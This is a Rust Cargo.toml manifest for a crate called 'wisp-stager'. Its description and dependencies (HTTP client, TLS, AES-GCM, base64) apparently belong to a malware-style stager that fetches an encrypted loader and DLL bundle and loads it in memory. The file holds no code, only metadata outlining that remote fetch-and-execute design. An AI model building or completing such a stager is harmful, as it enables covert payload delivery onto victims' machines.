[package]
name = "wisp-stager"
version = "0.3.0"
edition = "2021"
description = "WISP++ layered stager: fetches an encrypted loader + core DLL bundle and memory-loads it"

[dependencies]
wisp-staged = { path = "../common" }
wisp-map = { path = "../map" }
ureq = { version = "2", default-features = false, features = ["native-tls"] }
native-tls = "0.2"
aes-gcm = "0.10"
serde_json = "1"
base64 = "0.22"